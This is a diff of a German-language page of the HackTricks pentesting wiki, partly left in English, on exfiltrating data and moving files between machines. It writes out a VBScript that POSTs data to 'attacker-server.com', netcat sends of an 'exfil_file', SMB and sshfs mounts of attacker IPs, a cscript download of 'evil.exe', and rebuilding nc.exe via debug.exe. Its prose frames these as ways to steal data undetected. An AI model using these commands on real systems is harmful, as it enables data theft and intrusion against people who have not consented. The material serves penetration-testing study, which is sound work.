@@ -10,19 +10,19 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-## Häufig weißgelistete Domains zum Exfiltrieren von Informationen
+## Häufig weißgelistete Domains zur Informationsweiterleitung
 
 Überprüfen Sie [https://lots-project.com/](https://lots-project.com/), um häufig weißgelistete Domains zu finden, die missbraucht werden können
 
@@ -65,7 +65,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Dateien hochladen
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer, das GET- und POST-Anforderungen (auch Header) druckt**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python-Modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -185,29 +185,35 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltration
+### Exfiltration
 
-## Introduction
+Exfiltration techniques are used to **steal** data from a target network. Once an attacker gains access to a system, they need to find a way to **transfer** the stolen data back to their own infrastructure without being detected. This is where exfiltration techniques come into play.
 
-Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as using external storage devices, email, or network communication.
+#### Common Exfiltration Techniques
 
-## Techniques
+1. **Compression**: Data can be compressed before exfiltration to reduce its size and make it easier to transfer without raising suspicion.
 
-### Data Compression
+2. **Encryption**: Encrypting the stolen data before exfiltration can help evade detection by security tools that are not able to decrypt the data.
 
-Data can be compressed before exfiltration to reduce its size, making it easier to transfer without raising suspicion.
+3. **Steganography**: This technique involves hiding the stolen data within another file, such as an image or a document, to avoid detection.
 
-### Data Encryption
+4. **Protocol Tunneling**: Attackers can use protocol tunneling to encapsulate exfiltrated data within legitimate network protocols to bypass security controls.
 
-Encrypting the exfiltrated data can help prevent detection by security measures, as the content will appear as random characters without the decryption key.
+5. **DNS Tunneling**: By encoding data within DNS queries and responses, attackers can exfiltrate data without directly connecting to their command and control server.
 
-### Steganography
+#### Exfiltration Tools
 
-Steganography involves hiding data within other files or images to avoid detection. This can be a useful technique for exfiltrating data covertly.
+There are various tools available to facilitate data exfiltration, such as:
 
-## Tools
+- **Netcat**: A versatile networking utility that can be used to transfer data between systems.
+  
+- **Wget**: A command-line utility that can retrieve content from web servers, which can be abused for exfiltration purposes.
 
-There are various tools available for exfiltrating data, including custom scripts, open-source software, and commercial solutions. It is important to choose the right tool based on the specific exfiltration requirements and the target system's environment.
+- **Curl**: Another command-line tool for transferring data with support for various protocols.
+
+- **FTP**: File Transfer Protocol can be used for exfiltrating data to a remote server.
+
+By understanding and utilizing these exfiltration techniques and tools, attackers can successfully steal data from target networks without being detected.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -229,7 +235,9 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## Netzwerk-Kommunikation
+## Netzwerkkommunikation
+
+Netzwerkkommunikation bezieht sich auf die Techniken, die verwendet werden, um Daten aus einem Netzwerk zu extrahieren. Dies kann durch den Abfang von Netzwerkverkehr oder die Ausnutzung von Schwachstellen in der Netzwerksicherheit erfolgen. Einige gängige Methoden zur Netzwerkkommunikation sind das Tunneln von Daten über Protokolle wie HTTP oder DNS, das Versenden von Daten über alternative Ports und das Verwenden von verschlüsselten Kanälen wie VPNs. Es ist wichtig, diese Techniken zu verstehen, um potenzielle Schwachstellen zu identifizieren und zu beheben.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -304,20 +312,17 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 
 ### Exfiltration
 
-VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method and target URL, and sending the data in the request body. The following example demonstrates how data can be exfiltrated using VBScript:
+VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method and headers, and sending the data in the request body. The following example demonstrates how data can be exfiltrated using VBScript:
 
 ```vbscript
-Dim objHTTP, strData
+Dim objHTTP
 Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-strData = "SensitiveDataToExfiltrate"
-objHTTP.Open "POST", "http://attacker-server.com/exfiltrate.php", False
+objHTTP.Open "POST", "http://attacker-server.com/data", False
 objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-objHTTP.send strData
+objHTTP.send "data=exfiltrated_data"
 ```
 
-In this example, the VBScript code creates an HTTP POST request to `http://attacker-server.com/exfiltrate.php` with the data `SensitiveDataToExfiltrate` in the request body. The attacker can then receive and process this data on their server.
-
-It is important to note that exfiltrating data using VBScript may trigger security controls or be detected by security solutions, so it is crucial to implement obfuscation techniques and evade detection mechanisms to increase the chances of successful exfiltration.
+In this example, the script creates an HTTP POST request to "http://attacker-server.com/data" with the data "exfiltrated_data" in the request body. The attacker can then receive and process the exfiltrated data on their server.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -355,7 +360,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Das Programm `debug.exe` ermöglicht nicht nur die Inspektion von Binärdateien, sondern hat auch die **Fähigkeit, sie aus Hexadezimalwerten neu zu erstellen**. Das bedeutet, dass `debug.exe` anhand einer Hexadezimaldarstellung einer Binärdatei die Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass `debug.exe` eine **Einschränkung beim Zusammenstellen von Dateien bis zu 64 KB Größe** hat.
+Das Programm `debug.exe` ermöglicht nicht nur die Inspektion von Binärdateien, sondern hat auch die **Fähigkeit, sie aus Hexadezimalwerten neu zu erstellen**. Das bedeutet, dass `debug.exe` anhand eines Hexadezimalwerts einer Binärdatei die Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung beim Zusammenstellen von Dateien bis zu 64 KB Größe** hat.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -372,7 +377,7 @@ Dann kopieren Sie den Text in die Windows-Shell, und eine Datei namens nc.exe wi
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
